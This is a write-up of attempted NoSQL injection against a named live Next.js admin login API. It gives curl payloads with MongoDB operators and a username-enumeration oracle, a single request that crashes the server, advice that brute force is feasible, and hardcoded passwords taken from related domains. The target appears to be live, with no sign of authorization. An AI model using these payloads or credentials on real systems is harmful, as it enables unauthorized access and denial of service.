# NoSQLi via Next.js API Routes — Case Study

## Target
`giamsatquocte688.com` — Next.js 15 (Turbopack, Pages Router, autoExport/SSG)
behind Cloudflare. Admin panel with API routes for login, activation codes,
registrations, and subscription management.

## Discovery

### Step 1: Build manifest leaked full API route map

```
/_next/static/duB8_jQz3ep9wHi2IeiAV/_buildManifest.js
```

Revealed admin-only API endpoints:
- `POST /api/admin/login`
- `GET /api/admin/me`
- `POST /api/admin/logout`
- `GET /api/admin/activation-codes`
- `GET /api/admin/registrations`
- `GET /api/admin/subscription-codes`
- `POST /api/auth/activation`
- `POST /api/subscription/complete`

### Step 2: Type-confusion → 500 ISE differential

Normal request (string values):
```bash
curl -X POST "https://TARGET/api/admin/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}'
# → 401 {"error":"Sai tài khoản hoặc mật khẩu"}
```

Type-confused request (boolean, integer, array, object):
```bash
curl -d '{"username":true,"password":true}'       # → 500 ISE
curl -d '{"username":1,"password":1}'              # → 500 ISE
curl -d '{"username":["admin"],"password":["a"]}'  # → 500 ISE
curl -d '{"username":{"$ne":""},"password":{"$ne":""}}'  # → 500 ISE
```

### Step 3: Username enumeration oracle discovered

The critical diagnostic that proved operators DON'T reach MongoDB:

```bash
# Valid user + object password → 500 (crash in bcrypt.compare)
curl -d '{"username":"admin","password":{"$ne":""}}'     # → 500

# Invalid user + object password → 401 (early return, user not found)
curl -d '{"username":"nonexist","password":{"$ne":""}}'  # → 401

# Object username + string password → 500 (crash in username.trim())
curl -d '{"username":{"$regex":"^zzz"},"password":"test"}' # → 500
curl -d '{"username":{"$ne":""},"password":"test"}'       # → 500
```

### Step 4: Proving operators are NOT evaluated (the regex test)

If $regex were evaluated by MongoDB, a non-matching regex should return 401
(no user found). But ALL return 500 regardless:

```bash
curl -d '{"username":"admin","password":{"$regex":"^zzz_impossible"}}' # 500
curl -d '{"username":"admin","password":{"$regex":".*"}}'              # 500
curl -d '{"username":"admin","password":{"$ne":"wrongpass"}}'          # 500
curl -d '{"username":"admin","password":{"$eq":"admin"}}'             # 500
curl -d '{"username":"admin","password":{"$in":["admin","test"]}}'     # 500
curl -d '{"username":"admin","password":{"$nin":[]}}'                  # 500
curl -d '{"username":"admin","password":{"$mod":[1,0]}}'              # 500
curl -d '{"username":"admin","password":{"$type":2}}'                  # 500
curl -d '{"username":"admin","password":{"$size":0}}'                 # 500
curl -d '{"username":"admin","password":{"$exists":true}}'            # 500
```

ALL return 500 → operators NOT reaching MongoDB. Crash is in `bcrypt.compare()`.

### Step 5: Timing attack inconclusive behind Cloudflare

```bash
time curl -d '{"username":"admin","password":"test","$where":"sleep(3000)"}'
# → 0.26s (no measurable delay — $where not evaluated, ignored as extra field)
```

### Step 6: Form-encoded parameter pollution blocked

```bash
curl -d 'username=admin&password[$ne]=' -H "Content-Type: application/x-www-form-urlencoded"
# → 400 {"error":"Nhập đủ tài khoản và mật khẩu"} (app only parses JSON)
```

## Corrected Interpretation (22 approaches tested)

The 500 ISE on type confusion does NOT mean "operators reach the DB."
The app's auth flow is:

```javascript
// 1. Check falsy values
if (!username || !password) return res.status(400).json({error: "Nhập đủ"});

// 2. String method on username — crashes on object
// (if username is object, .trim() throws → 500)
const cleanUsername = username.trim().toLowerCase();

// 3. Query MongoDB by username only
const user = await User.findOne({ username: cleanUsername });

// 4. Early return if not found
if (!user) return res.status(401).json({error: "Sai tài khoản"});

// 5. bcrypt.compare — crashes on object password
// (bcrypt tries .charAt() on object → TypeError → 500)
const match = await bcrypt.compare(password, user.passwordHash);
```

**Three crash locations:**
1. `username.trim()` — object username → 500 (before any DB query)
2. `bcrypt.compare(object, hash)` — object password + valid user → 500
3. `user.passwordHash` on null — shouldn't happen (step 4 catches null)

**The oracle: 500 vs 401 on object password = username enumeration only.**
- `{"username":"admin","password":{"$ne":""}}` → 500 = "admin" exists
- `{"username":"nonexist","password":{"$ne":""}}` → 401 = not found

**Operators NEVER reach MongoDB on this target.** The password is always
processed by bcrypt, never passed as a MongoDB query operator. The username
is always `.trim()`'d before being passed to `findOne()`.

## What IS Exploitable

1. **Username enumeration** (500 = exists, 401 = not found) — confirmed `admin`
2. **DoS** — single `{"password":{"$ne":""}}` crashes the server
3. **No rate limiting** — 20 rapid requests, no 429/lockout → brute force feasible
4. **Hardcoded passwords on related domains** — `login.giamsat68.com/base.js`
   has `FIXED_PASS = "336336"`, `goivip.giamsat68.com/base.js` has
   `FIXED_ACTIVATION_CODE = "998998"` (client-side only, doesn't work on
   the Next.js app but reveals operator's password patterns)

## Key Takeaways

1. **Build manifest is the fastest route discovery** — lists every page
   and API route including admin-only endpoints
2. **500 ISE ≠ operators reach DB** — 22 approaches proved all operators
   crash in bcrypt or .trim(), NOT in MongoDB. Always verify with the
   regex test (non-matching regex should return 401 if evaluated)
3. **The bcrypt wall** — if app does `findOne({username})` then
   `bcrypt.compare(password, hash)`, password operators NEVER reach DB
4. **Username enumeration is still valuable** — 500/401 oracle + no rate
   limit = brute force with string passwords
5. **Cloudflare masks timing** — `$where sleep()` produced no delay
6. **Form-encoded injection blocked** — Next.js API routes only parse
   `application/json`, not `x-www-form-urlencoded`
7. **Related domains leak patterns** — check static HTML sites for
   hardcoded credentials that reveal the operator's password style
